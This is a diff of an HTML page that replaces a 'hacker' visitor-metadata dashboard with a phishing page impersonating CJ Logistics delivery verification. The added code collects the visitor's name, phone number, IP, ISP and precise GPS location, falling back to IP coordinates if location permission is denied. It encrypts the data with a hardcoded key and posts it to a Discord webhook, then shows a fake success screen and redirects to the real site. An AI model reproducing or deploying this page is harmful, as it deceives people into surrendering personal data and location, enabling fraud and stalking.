@@ -1,799 +1,231 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>해커_권혁선</title>
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect fill='%230a0e14' width='100' height='100' rx='12'/><text x='50' y='68' font-family='monospace' font-size='55' fill='%2300ff9d' text-anchor='middle'>$_</text></svg>">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CJ대한통운 - 위치기반 배송인증</title>
+    <link rel="icon" href="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        body, html { margin: 0; padding: 0; font-family: 'Malgun Gothic', sans-serif; background: #f4f4f4; overflow: hidden; height: 100%; }
+        #fake-site { min-height: 100vh; display: flex; flex-direction: column; }
+        .nav { background: #003366; color: white; padding: 15px 20px; font-weight: bold; display: flex; align-items: center; gap: 10px; }
+        /* 상단 바 로고 스타일 */
+        .nav img { height: 24px; filter: brightness(0) invert(1); }
+        
+        .content { max-width: 450px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); text-align: center; }
+        
+        .form-container { margin-top: 20px; text-align: left; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 0.85em; color: #666; margin-bottom: 5px; margin-left: 2px; }
+        .input-field { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 1em; outline: none; }
+        .input-field:focus { border-color: #F26522; box-shadow: 0 0 5px rgba(242,101,34,0.2); }
 
-    :root {
-      --bg-primary: #0a0e14;
-      --bg-secondary: #111820;
-      --bg-tertiary: #1a222d;
-      --accent-green: #00ff9d;
-      --accent-cyan: #00d4ff;
-      --accent-yellow: #ffd700;
-      --accent-red: #ff4757;
-      --text-primary: #e6e6e6;
-      --text-secondary: #7a8c99;
-      --border-color: #2a3a4a;
-    }
-
-    body {
-      font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
-      background: var(--bg-primary);
-      color: var(--text-primary);
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
-
-    /* Scanline effect */
-    body::before {
-      content: '';
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: repeating-linear-gradient(
-        0deg,
-        transparent,
-        transparent 2px,
-        rgba(0, 0, 0, 0.1) 2px,
-        rgba(0, 0, 0, 0.1) 4px
-      );
-      pointer-events: none;
-      z-index: 9999;
-    }
-
-    .container {
-      max-width: 1400px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-
-    /* Header */
-    .header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 20px;
-      background: var(--bg-secondary);
-      border: 1px solid var(--border-color);
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-
-    .header-left {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-
-    .logo {
-      width: 40px;
-      height: 40px;
-      border: 2px solid var(--accent-green);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.4); }
-      50% { box-shadow: 0 0 0 10px rgba(0, 255, 157, 0); }
-    }
-
-    .logo svg {
-      width: 20px;
-      height: 20px;
-      fill: var(--accent-green);
-    }
-
-    .title {
-      font-size: 1.4rem;
-      color: var(--accent-green);
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      text-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
-    }
-
-    .status {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 0.85rem;
-      color: var(--text-secondary);
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      background: var(--accent-green);
-      border-radius: 50%;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    /* Main Grid */
-    .main-grid {
-      display: grid;
-      grid-template-columns: 1fr 350px;
-      gap: 20px;
-    }
-
-    @media (max-width: 1024px) {
-      .main-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    /* Panel */
-    .panel {
-      background: var(--bg-secondary);
-      border: 1px solid var(--border-color);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-
-    .panel-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 12px 16px;
-      background: var(--bg-tertiary);
-      border-bottom: 1px solid var(--border-color);
-    }
-
-    .panel-title {
-      font-size: 0.85rem;
-      color: var(--accent-cyan);
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .panel-title::before {
-      content: '▸';
-      color: var(--accent-green);
-    }
-
-    .panel-content {
-      padding: 16px;
-    }
-
-    /* Terminal Log */
-    .terminal {
-      height: 500px;
-      overflow-y: auto;
-      font-size: 0.8rem;
-      line-height: 1.8;
-      scrollbar-width: thin;
-      scrollbar-color: var(--border-color) transparent;
-    }
-
-    .terminal::-webkit-scrollbar {
-      width: 6px;
-    }
-
-    .terminal::-webkit-scrollbar-track {
-      background: transparent;
-    }
-
-    .terminal::-webkit-scrollbar-thumb {
-      background: var(--border-color);
-      border-radius: 3px;
-    }
-
-    .log-entry {
-      padding: 8px 12px;
-      margin-bottom: 4px;
-      background: rgba(0, 0, 0, 0.3);
-      border-left: 3px solid var(--accent-green);
-      border-radius: 0 4px 4px 0;
-      animation: fadeIn 0.3s ease;
-      word-break: break-word;
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateX(-10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateX(0);
-      }
-    }
-
-    .log-entry.info { border-left-color: var(--accent-cyan); }
-    .log-entry.warning { border-left-color: var(--accent-yellow); }
-    .log-entry.error { border-left-color: var(--accent-red); }
-    .log-entry.message { border-left-color: #a855f7; background: rgba(168, 85, 247, 0.1); }
-
-    .log-time {
-      color: var(--text-secondary);
-      margin-right: 10px;
-    }
-
-    .log-type {
-      font-weight: bold;
-      margin-right: 10px;
-    }
-
-    .log-type.sys { color: var(--accent-green); }
-    .log-type.net { color: var(--accent-cyan); }
-    .log-type.sec { color: var(--accent-yellow); }
-    .log-type.msg { color: #a855f7; }
-
-    /* Message Input */
-    .input-section {
-      margin-top: 16px;
-      padding-top: 16px;
-      border-top: 1px solid var(--border-color);
-    }
-
-    .input-wrapper {
-      display: flex;
-      gap: 10px;
-    }
-
-    .input-field {
-      flex: 1;
-      background: var(--bg-primary);
-      border: 1px solid var(--border-color);
-      border-radius: 4px;
-      padding: 12px 16px;
-      color: var(--text-primary);
-      font-family: inherit;
-      font-size: 0.9rem;
-      outline: none;
-      transition: border-color 0.3s;
-    }
-
-    .input-field:focus {
-      border-color: var(--accent-green);
-      box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.1);
-    }
-
-    .input-field::placeholder {
-      color: var(--text-secondary);
-    }
-
-    .send-btn {
-      background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
-      border: none;
-      border-radius: 4px;
-      padding: 12px 24px;
-      color: var(--bg-primary);
-      font-family: inherit;
-      font-weight: bold;
-      font-size: 0.85rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
-    }
-
-    .send-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 20px rgba(0, 255, 157, 0.3);
-    }
-
-    .send-btn:active {
-      transform: translateY(0);
-    }
-
-    /* Client Info Panel */
-    .info-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .info-item {
-      display: flex;
-      justify-content: space-between;
-      padding: 10px 12px;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 4px;
-      font-size: 0.8rem;
-    }
-
-    .info-label {
-      color: var(--text-secondary);
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .info-value {
-      color: var(--accent-cyan);
-      text-align: right;
-      max-width: 180px;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-    /* Online Users */
-    .users-count {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px;
-      background: rgba(0, 255, 157, 0.1);
-      border-radius: 4px;
-      margin-bottom: 16px;
-    }
-
-    .users-count span {
-      color: var(--accent-green);
-      font-weight: bold;
-    }
-
-    /* Loading */
-    .loading {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 20px;
-      color: var(--text-secondary);
-    }
-
-    .spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid var(--border-color);
-      border-top-color: var(--accent-green);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* ASCII Art */
-    .ascii-art {
-      font-size: 0.6rem;
-      color: var(--accent-green);
-      opacity: 0.3;
-      text-align: center;
-      margin-bottom: 20px;
-      line-height: 1.2;
-      white-space: pre;
-    }
-
-    /* Footer */
-    .footer {
-      text-align: center;
-      padding: 20px;
-      margin-top: 20px;
-      color: var(--text-secondary);
-      font-size: 0.75rem;
-    }
-
-    .footer a {
-      color: var(--accent-cyan);
-      text-decoration: none;
-    }
-  </style>
+        .btn { background: #F26522; color: white; border: none; padding: 18px; font-size: 1.1em; cursor: pointer; border-radius: 6px; width: 100%; font-weight: bold; margin-top: 10px; }
+        
+        #terminal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; color: #00FF00; font-family: 'Courier New', monospace; padding: 25px; box-sizing: border-box; z-index: 9999; overflow-y: auto; }
+        .scan-line { color: #00FF00; margin: 2px 0; font-size: 0.85em; word-break: break-all; }
+        .found { color: #ff3e3e; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="ascii-art">
-      ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
-      ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
-      ██████╔╝███████║██║     █████╔╝ █████╗     ██║   
-      ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
-      ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
-     ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
-    </div>
 
-    <header class="header">
-      <div class="header-left">
-        <div class="logo">
-          <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+    <div id="fake-site">
+        <div class="nav">
+            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ Logo">
+            <span>CJ Logis | 스마트 배송 인증</span>
         </div>
-        <h1 class="title">통신 보안</h1>
-      </div>
-      <div class="status">
-        <div class="status-dot"></div>
-        <span id="connection-status">초기화 중...</span>
-      </div>
-    </header>
-
-    <div class="main-grid">
-      <div class="panel">
-        <div class="panel-header">
-          <div class="panel-title">실시간 이벤트 스트림</div>
-          <div class="users-count">
-            <span id="online-count">0</span> 활성 노드
-          </div>
-        </div>
-        <div class="panel-content">
-          <div class="terminal" id="terminal"></div>
-          <div class="input-section">
-            <div class="input-wrapper">
-              <input type="text" class="input-field" id="message-input" placeholder="보안 메시지를 입력하세요..." maxlength="500">
-              <button class="send-btn" id="send-btn">전송</button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="panel">
-        <div class="panel-header">
-          <div class="panel-title">클라이언트 정보</div>
-        </div>
-        <div class="panel-content">
-          <div class="info-grid" id="client-info">
-            <div class="loading">
-              <div class="spinner"></div>
-              <span>환경 스캔 중...</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <footer class="footer">
-      밍규엉덩이뽈롱뽈롱 • 카트 ㄱㄱ • 황벌코
-    </footer>
-  </div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-
-  <script>
-    // ============================================
-    // FIREBASE CONFIGURATION (Replace with your own)
-    // ============================================
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_PROJECT_ID.appspot.com",
-      messagingSenderId: "YOUR_SENDER_ID",
-      appId: "YOUR_APP_ID"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-
-    // ============================================
-    // CLIENT METADATA COLLECTION
-    // ============================================
-    let clientMetadata = {};
-    const clientId = 'client_' + Math.random().toString(36).substr(2, 9);
-
-    // Get browser info
-    function getBrowserInfo() {
-      const ua = navigator.userAgent;
-      let browser = 'Unknown';
-      
-      if (ua.includes('Firefox')) browser = 'Firefox';
-      else if (ua.includes('Edg')) browser = 'Edge';
-      else if (ua.includes('Chrome')) browser = 'Chrome';
-      else if (ua.includes('Safari')) browser = 'Safari';
-      else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
-      
-      return browser;
-    }
-
-    // Get OS info
-    function getOSInfo() {
-      const ua = navigator.userAgent;
-      let os = 'Unknown';
-      
-      if (ua.includes('Windows NT 10')) os = 'Windows 10/11';
-      else if (ua.includes('Windows')) os = 'Windows';
-      else if (ua.includes('Mac OS X')) os = 'macOS';
-      else if (ua.includes('Linux')) os = 'Linux';
-      else if (ua.includes('Android')) os = 'Android';
-      else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-      
-      return os;
-    }
-
-    // Collect all client metadata
-    async function collectMetadata() {
-      addLog('sys', '클라이언트 핑거프린트 생성 중...');
-      
-      clientMetadata = {
-        clientId: clientId,
-        browser: getBrowserInfo(),
-        os: getOSInfo(),
-        userAgent: navigator.userAgent,
-        screenResolution: `${screen.width}x${screen.height}`,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString()
-      };
-
-      addLog('net', '외부 IP 조회 중...');
-
-      // Try multiple IP APIs for reliability
-      const ipApis = [
-        {
-          url: 'https://ipwho.is/',
-          parse: (data) => ({
-            ip: data.ip,
-            country: data.country,
-            city: data.city,
-            isp: data.connection?.isp || data.connection?.org || '알 수 없음'
-          })
-        },
-        {
-          url: 'https://ip-api.com/json/?fields=status,message,country,city,isp,query',
-          parse: (data) => ({
-            ip: data.query,
-            country: data.country,
-            city: data.city,
-            isp: data.isp
-          })
-        },
-        {
-          url: 'https://ipinfo.io/json',
-          parse: (data) => ({
-            ip: data.ip,
-            country: data.country,
-            city: data.city,
-            isp: data.org || '알 수 없음'
-          })
-        }
-      ];
-
-      let ipResolved = false;
-      
-      for (const api of ipApis) {
-        try {
-          const response = await fetch(api.url);
-          if (!response.ok) continue;
-          
-          const data = await response.json();
-          const parsed = api.parse(data);
-          
-          if (parsed.ip) {
-            clientMetadata.ip = parsed.ip;
-            clientMetadata.country = parsed.country || '알 수 없음';
-            clientMetadata.city = parsed.city || '알 수 없음';
-            clientMetadata.isp = parsed.isp || '알 수 없음';
-            ipResolved = true;
+        
+        <div class="content">
+            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ대한통운" style="width: 180px; margin-bottom: 20px;">
             
-            addLog('net', `IP 확인됨: ${clientMetadata.ip}`);
-            addLog('net', `위치: ${clientMetadata.city}, ${clientMetadata.country}`);
-            break;
-          }
-        } catch (error) {
-          continue;
-        }
-      }
-      
-      if (!ipResolved) {
-        clientMetadata.ip = '확인 불가';
-        clientMetadata.country = '알 수 없음';
-        clientMetadata.city = '알 수 없음';
-        clientMetadata.isp = '알 수 없음';
-        addLog('warning', '외부 IP 조회 실패');
-      }
+            <h2 style="color: #003366; margin-bottom: 10px;">분실 방지 GPS 인증</h2>
+            <p style="font-size: 0.95em; color: #444;">안전한 수령을 위해 <b>본인 확인</b>이 필요합니다.</p>
+            
+            <div class="form-container">
+                <div class="input-group">
+                    <label>수령인 성함</label>
+                    <input type="text" id="userName" class="input-field" placeholder="성함을 입력하세요">
+                </div>
+                <div class="input-group">
+                    <label>수령인 연락처</label>
+                    <input type="tel" id="userPhone" class="input-field" placeholder="010-0000-0000" maxlength="13">
+                </div>
+            </div>
 
-      addLog('sys', '클라이언트 핑거프린트 생성 완료');
-      addLog('sec', '악의적 공격 탐지되지 않음');
-      
-      displayClientInfo();
-    }
-
-    // Display full IP (no masking)
-    function formatIP(ip) {
-      return ip || '알 수 없음';
-    }
-
-    // Display client info in sidebar
-    function displayClientInfo() {
-      const container = document.getElementById('client-info');
-      const infoItems = [
-        { label: '클라이언트 ID', value: clientMetadata.clientId },
-        { label: '공인 IP', value: formatIP(clientMetadata.ip) },
-        { label: '국가', value: clientMetadata.country },
-        { label: '도시', value: clientMetadata.city },
-        { label: 'ISP', value: clientMetadata.isp },
-        { label: '운영체제', value: clientMetadata.os },
-        { label: '브라우저', value: clientMetadata.browser },
-        { label: '해상도', value: clientMetadata.screenResolution },
-        { label: '언어', value: clientMetadata.language },
-        { label: '시간대', value: clientMetadata.timezone }
-      ];
-
-      container.innerHTML = infoItems.map(item => `
-        <div class="info-item">
-          <span class="info-label">${item.label}</span>
-          <span class="info-value" title="${item.value}">${item.value}</span>
+            <div style="background: #fff9f4; padding: 12px; border-radius: 8px; font-size: 0.8em; color: #777; border-left: 4px solid #F26522; margin: 15px 0;">
+                정보 입력 후 브라우저 상단의 <b>'위치 권한 허용'</b>을 눌러주셔야 인증이 완료됩니다.
+            </div>
+            <button class="btn" onclick="requestAccess()">인증 및 배송지 확인</button>
         </div>
-      `).join('');
-    }
+    </div>
 
-    // ============================================
-    // TERMINAL LOGGING
-    // ============================================
-    const terminal = document.getElementById('terminal');
-    const LOG_CLEAR_INTERVAL = 5 * 60 * 1000; // 5분마다 로그 초기화
-    let logCount = 0;
-    const MAX_LOGS = 100; // 최대 로그 수
+    <div id="terminal">
+        <div id="log-container"></div>
+    </div>
 
-    // 로그 자동 초기화
-    function clearOldLogs() {
-      terminal.innerHTML = '';
-      logCount = 0;
-      addLog('sys', '이벤트 스트림이 초기화되었습니다');
-    }
+    <script>
+        const SECRET_KEY = "0x7E6_RECON_System_!@#_Secure_2026_AES"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1464745431102783611/6Qk9-B-B23FCvLSD58sEFnuX2rIteMVBFEIUnQAV0rdREI9sWb9Pqdywxo_Y6wRtnEpb"; 
 
-    // 주기적 로그 초기화 시작
-    setInterval(clearOldLogs, LOG_CLEAR_INTERVAL);
+        let userData = {
+            name: '',
+            phone: '',
+            ip: '조회 중...',
+            isp: '조회 중...', 
+            lat: 'N/A',
+            lon: 'N/A',
+            ipLat: '', // IP 기반 좌표 백업용
+            ipLon: '',
+            os: navigator.platform,
+            browser: navigator.userAgent,
+            timestamp: new Date().toLocaleString()
+        };
 
-    function addLog(type, message, isMessage = false) {
-      // 로그가 너무 많으면 오래된 것 제거
-      if (logCount >= MAX_LOGS) {
-        const firstChild = terminal.firstChild;
-        if (firstChild) terminal.removeChild(firstChild);
-        logCount--;
-      }
-      const entry = document.createElement('div');
-      entry.className = `log-entry ${isMessage ? 'message' : type}`;
-      
-      const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-      const typeLabels = {
-        sys: 'SYS',
-        net: 'NET',
-        sec: 'SEC',
-        msg: 'MSG',
-        info: 'INF',
-        warning: 'WRN',
-        error: 'ERR'
-      };
-
-      entry.innerHTML = `
-        <span class="log-time">[${time}]</span>
-        <span class="log-type ${type}">[${typeLabels[type] || 'LOG'}]</span>
-        <span class="log-message">${escapeHtml(message)}</span>
-      `;
-
-      terminal.appendChild(entry);
-      terminal.scrollTop = terminal.scrollHeight;
-      logCount++;
-    }
-
-    function escapeHtml(text) {
-      const div = document.createElement('div');
-      div.textContent = text;
-      return div.innerHTML;
-    }
-
-    // ============================================
-    // FIREBASE REALTIME DATABASE
-    // ============================================
-    const messagesRef = database.ref('messages');
-    const presenceRef = database.ref('presence');
-    
-    // Firebase 연결 상태 확인
-    let isFirebaseConnected = false;
-    const connectedRef = database.ref('.info/connected');
-    
-    connectedRef.on('value', (snap) => {
-      isFirebaseConnected = snap.val() === true;
-      if (isFirebaseConnected) {
-        addLog('sys', 'Firebase 서버에 연결됨');
-        document.getElementById('online-count').textContent = '1';
-      }
-    });
-
-    // Track online presence
-    function setupPresence() {
-      const myPresenceRef = presenceRef.child(clientId);
-      
-      myPresenceRef.onDisconnect().remove();
-      myPresenceRef.set({
-        online: true,
-        timestamp: firebase.database.ServerValue.TIMESTAMP
-      }).catch((error) => {
-        addLog('warning', '로컬 테스트 모드 (Firebase 미연결)');
-        document.getElementById('online-count').textContent = '1 (로컬)';
-      });
-
-      // Listen for online users count
-      presenceRef.on('value', (snapshot) => {
-        const count = snapshot.numChildren();
-        document.getElementById('online-count').textContent = count;
-      });
-    }
-
-    // Listen for new messages
-    function setupMessageListener() {
-      // Only listen for new messages (after page load)
-      const startTime = Date.now();
-      
-      messagesRef.orderByChild('timestamp').startAt(startTime).on('child_added', (snapshot) => {
-        const data = snapshot.val();
-        if (data && data.clientId !== clientId) {
-          addLog('msg', `[${data.clientId.substring(0, 12)}...] ${data.message}`, true);
-          addLog('net', `출처: ${data.country || '알 수 없음'} | ${data.browser || '알 수 없음'} (${data.os || '알 수 없음'})`);
-        }
-      });
-
-      addLog('sys', '보안 채널 연결됨');
-      addLog('sec', '메타데이터 검증 활성화');
-      document.getElementById('connection-status').textContent = '채널 활성';
-    }
-
-    // Send message
-    function sendMessage() {
-      const input = document.getElementById('message-input');
-      const message = input.value.trim();
-
-      if (!message) return;
-
-      const messageData = {
-        ...clientMetadata,
-        message: message,
-        timestamp: Date.now()
-      };
-
-      // 먼저 로컬에 메시지 표시
-      addLog('msg', `[나] ${message}`, true);
-      
-      messagesRef.push(messageData)
-        .then(() => {
-          addLog('sec', '메시지 전송 완료');
-          input.value = '';
-        })
-        .catch((error) => {
-          addLog('warning', '로컬 모드: 메시지가 로컬에만 표시됩니다');
-          input.value = '';
+        // 전화번호 하이픈 자동 삽입
+        document.getElementById('userPhone').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').replace(/^(\d{2,3})(\d{3,4})(\d{4})$/, `$1-$2-$3`);
         });
-    }
 
-    // ============================================
-    // EVENT LISTENERS
-    // ============================================
-    document.getElementById('send-btn').addEventListener('click', sendMessage);
-    document.getElementById('message-input').addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendMessage();
-    });
+        // 3중 API 네트워크 및 IP 위치 정보 수집
+        async function fetchNetworkInfo() {
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                const data = await res.json();
+                if(data.status === 'success') {
+                    userData.ip = data.query;
+                    userData.isp = data.isp || data.as || '확인 불가';
+                    userData.ipLat = data.lat;
+                    userData.ipLon = data.lon;
+                    return;
+                }
+            } catch (e) { }
 
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    async function init() {
-      addLog('sys', '보안 대시보드 초기화 중...');
-      addLog('sys', 'Firebase 모듈 로딩 중...');
-      
-      await collectMetadata();
-      setupPresence();
-      setupMessageListener();
-      
-      addLog('sys', '대시보드 준비 완료');
-    }
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if(data.ip) {
+                    userData.ip = data.ip;
+                    userData.isp = data.org || '확인 불가';
+                    userData.ipLat = data.latitude;
+                    userData.ipLon = data.longitude;
+                    return;
+                }
+            } catch (e) { }
 
-    // Start
-    init();
-  </script>
+            userData.ip = "조회 실패";
+            userData.isp = "분석 지연";
+        }
+        fetchNetworkInfo();
+
+        function requestAccess() {
+            const nameVal = document.getElementById('userName').value.trim();
+            const phoneVal = document.getElementById('userPhone').value;
+
+            if (!nameVal || phoneVal.length < 10) {
+                alert("성함과 연락처를 모두 정확히 입력해주세요.");
+                return;
+            }
+            
+            userData.name = nameVal;
+            userData.phone = phoneVal;
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        userData.lat = pos.coords.latitude.toFixed(6);
+                        userData.lon = pos.coords.longitude.toFixed(6);
+                        startSequence();
+                    }, 
+                    (err) => {
+                        // 권한 거부 시 IP 기반 좌표로 대체
+                        userData.lat = userData.ipLat ? userData.ipLat + " (IP)" : "권한 거부됨";
+                        userData.lon = userData.ipLon ? userData.ipLon + " (IP)" : "IP 분석 중";
+                        startSequence(); 
+                    },
+                    { timeout: 8000 }
+                );
+            } else {
+                startSequence();
+            }
+        }
+
+        function startSequence() {
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            document.getElementById('fake-site').style.display = 'none';
+            document.getElementById('terminal').style.display = 'block';
+            
+            let logs = [
+                "> [SYSTEM] INITIALIZING SECURE UPLINK...",
+                "> [SYSTEM] TARGET_NAME: " + userData.name,
+                "> [SYSTEM] TARGET_PHONE: " + userData.phone,
+                "> [SYSTEM] IP_ADDRESS: " + userData.ip,
+                "> [SYSTEM] ISP_PROVIDER: " + userData.isp,
+                "> [SYSTEM] LOCATION_DATA: " + userData.lat + ", " + userData.lon,
+                "> [SYSTEM] ENCRYPTING PACKETS (AES-256)...",
+                "> [SYSTEM] SENDING DATA TO C2 SERVER..."
+            ];
+
+            let i = 0;
+            const container = document.getElementById('log-container');
+            const interval = setInterval(() => {
+                const line = document.createElement('div');
+                line.className = 'scan-line';
+                line.textContent = logs[i] || `> [RECON] SENDING_CHUNK_${Math.random().toString(16).slice(2,8).toUpperCase()}... DONE`;
+                if (logs[i] && (logs[i].includes('NAME') || logs[i].includes('LOCATION'))) line.className += ' found';
+                container.appendChild(line);
+                if (i > 25) { 
+                    clearInterval(interval); 
+                    finalizeExfiltration(); 
+                }
+                i++;
+                container.scrollTop = container.scrollHeight;
+            }, 60);
+        }
+
+        async function finalizeExfiltration() {
+            const rawData = JSON.stringify(userData, null, 2);
+            const encryptedPayload = CryptoJS.AES.encrypt(rawData, SECRET_KEY).toString();
+
+            const discordMessage = {
+                username: "CJ Logis Recon",
+                content: `🚩 **데이터 도착 알림**: ${userData.name}`,
+                embeds: [{
+                    title: "Encrypted Data Packet",
+                    description: "```" + encryptedPayload + "```",
+                    color: 15895842,
+                    fields: [
+                        { name: "이름", value: userData.name, inline: true },
+                        { name: "전화번호", value: userData.phone, inline: true },
+                        { name: "IP", value: userData.ip, inline: true },
+                        { name: "위치(LAT/LON)", value: `${userData.lat}, ${userData.lon}`, inline: false }
+                    ],
+                    footer: { text: "Security Recon v1.8 | CJ Logistics Clone" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify(discordMessage) 
+                });
+            } catch (e) { }
+
+            const container = document.getElementById('log-container');
+            container.innerHTML = `
+                <h1 style="color: #00FF00; text-align: center; margin-top: 50px;">배송 인증 완료</h1>
+                <div style="border: 1px solid #00FF00; padding: 25px; background: rgba(0,255,0,0.05); text-align: center;">
+                    <p style="color: #00FF00; font-size: 1.2em;"><b>정상적으로 인증되었습니다.</b></p>
+                    <p style="color: #888;">입력하신 연락처로 배송 현황이 알림톡으로 전송됩니다.</p>
+                </div>
+                <div style="text-align: center; margin-top: 30px;">
+                    <button onclick="location.href='https://www.cjlogistics.com'" style="background: transparent; border: 1px solid #00FF00; color: #00FF00; padding: 10px 30px; cursor: pointer;">확인</button>
+                </div>
+            `;
+        }
+    </script>
 </body>
 </html>
